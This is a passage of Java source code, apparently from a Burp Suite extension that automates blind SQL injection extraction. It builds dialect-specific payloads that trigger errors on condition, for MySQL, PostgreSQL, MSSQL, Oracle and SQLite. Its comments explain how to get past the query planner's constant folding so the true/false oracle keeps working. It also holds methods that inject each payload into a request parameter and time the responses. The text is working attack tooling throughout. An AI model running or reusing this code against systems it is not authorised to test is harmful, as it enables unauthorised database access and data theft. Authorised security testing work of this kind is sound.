        // while THEN returns NUMBER (1) → ORA type mismatch → ALL requests error → nothing extracted.
        // Using 1/0 directly: both branches return NUMBER. Oracle only evaluates the active branch
        // at runtime, so TRUE → 1 (no error), FALSE → 1/0 (ORA-01476: divisor is equal to zero).
        //
        // CRITICAL: Plain `1/0` is a constant expression. PostgreSQL (and some MSSQL/Oracle
        // versions) constant-fold CASE WHEN branches at plan time, evaluating BOTH branches
        // regardless of the condition. This breaks the boolean oracle — every request errors.
        // Fix: wrap the zero in a scalar subquery `(SELECT 0)` which is a SubLink node that
        // the planner won't constant-fold. The CASE WHEN then short-circuits correctly at
        // execution time: TRUE → 1 (no error), FALSE → 1/0 (runtime division-by-zero error).
        return switch (dialect.getName()) {
            case "MySQL" -> "(SELECT 1 UNION SELECT 2)";
            case "PostgreSQL" -> "1/(SELECT 0)";       // subquery prevents constant folding
            case "MSSQL" -> "1/(SELECT 0)";             // same fix for MSSQL planner
            case "Oracle" -> "1/(SELECT 0 FROM dual)";  // Oracle requires FROM dual in subqueries
            case "SQLite" -> "ZEROBLOB(-1)";            // SQLite doesn't constant-fold functions
            default -> "(SELECT 1 UNION SELECT 2)";
        };
    }

    /** Whether this extractor is operating in inference mode (behavioral, not error-text) */
    public boolean isInferenceMode() { return inferenceMode; }

    /**
     * Send a request with the payload injected using the stored working boundary.
     * Used during extraction phase (after detect() has found a working boundary).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    /**
     * Send a request with the payload injected using a specific boundary.
     * Used during detection phase to try different prefix/suffix combinations.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    prefix + payload + (suffix.isEmpty() ? "" : suffix));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "ERROR", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }
}
